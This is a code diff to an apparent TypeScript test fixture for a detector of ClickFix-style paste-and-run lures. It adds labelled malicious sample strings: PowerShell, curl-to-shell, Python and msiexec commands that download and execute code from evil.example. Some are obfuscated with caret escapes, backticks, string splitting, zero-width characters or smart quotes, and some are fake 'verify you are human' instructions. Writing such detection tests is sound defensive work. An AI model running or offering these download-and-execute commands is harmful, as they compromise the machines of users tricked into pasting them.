@@ -21,11 +21,18 @@ const MALICIOUS: Array<[string, string]> = [
   ["osascript -e 'do shell script \"curl -s https://evil.example/p | sh\"'", "curl-pipe-shell"],
   ["powershell -c \"iwr evil.example/f -o $env:tmp\\f.exe;start $env:tmp\\f.exe\" # C:\\Users\\Public\\Downloads\\report.pdf", "filefix-path-comment"],
   ["python3 -c \"import urllib.request as u;exec(u.urlopen('https://evil.example/p').read())\"", "python-inline-loader"],
+  // Caret-escaped cmd keyword (obfuscation).
+  ["c^m^d /c p^o^w^e^r^s^h^e^l^l -c \"iex(irm https://evil.example/x)\"", "powershell-download-exec"],
+  // Backtick-broken PowerShell.
+  ["p`o`w`e`r`s`h`e`l`l -w hidden -c whoami", "powershell-hidden"],
+  // String-concatenation split used on ClickFix pages.
+  ["\"p\"+\"owershell\" -w hidden -c whoami", "powershell-hidden"],
+  ["To continue, open Terminal and paste: bash -c \"whoami\"", "run-dialog-instruction"],
   // Zero-width characters sprinkled in to defeat naive matching.
   ["power\u200Bshell -w hid\u200Bden -c \"iex(iwr http://evil.example/x)\"", "powershell-hidden"],
   // Smart quotes from a styled web page.
   ["powershell -w hidden -c \u201Ciex (irm https://evil.example/x)\u201D", "powershell-hidden"],
-  ["Press Win+R, paste and hit Enter to verify you are human: msiexec /i http://evil.example/verify.msi /qn Cloudflare Verification", "clickfix-marker"],
+  ["Press Win+R, paste and hit Enter to verify you are human: msiexec /i http://evil.example/verify.msi /qn Cloudflare Verification", "run-dialog-instruction"],
 ];
 
 const BENIGN: string[] = [
